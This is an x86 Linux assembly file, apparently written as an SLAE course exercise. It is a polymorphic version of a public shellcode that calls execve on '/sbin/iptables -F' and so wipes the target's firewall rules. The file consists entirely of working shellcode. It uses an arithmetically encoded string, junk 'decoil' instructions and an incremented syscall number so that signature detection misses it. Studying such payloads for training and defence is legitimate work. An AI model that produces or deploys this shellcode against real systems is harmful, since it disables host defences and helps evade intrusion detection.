; Polymorphic version of "iptables -flush" shellcode from http://shell-storm.org/shellcode/files/shellcode-825.php
; 61 bytes (original shellcode 43 bytes)
; Guillaume Kaddouch
; SLAE-681

global _start

section .text

_start:

	; int execve(const char *filename, char *const argv[], char *const envp[]);

	pxor mm0, mm1				; decoil instruction

	xor eax,eax				; zero out eax
	mov [esp], eax				; push NULL on stack, manually
	sub esp, 0x4

	push word 0x462d			; push '-F' on stack
	mov esi,esp				; esi = *ptr to '-F' argument

	push eax				; push NULL terminating string on stack
	push dword 0x73656c62			; bles

	mov edx, 0x50636058			; encoded 'ipta' string
	add edx, 0x11111011			; convert back 'ipta' to clear text
	push edx

	push dword 0x2f6e6962			; bin/
	push dword 0x732f2f2f			; ///s
	mov ebx,esp				; ebx = *ptr to '///sbin/iptables'

	push eax				; push NULL
	push esi				; *ptr to -F

	cdq					; decoil instruction

	push ebx				; 1st arg: *filename ///sbin/iptables
	mov ecx,esp				; 2nd arg: *argv [*filename, -F]
	mov edx,eax				; 3rd arg: *envp = 0x00

	mov al,0xa				; syscall we won't call
	inc al					; 0xa + 0x1 = 0xb = execve()
	int 0x80				; execve(*filename, *argv, *envp)

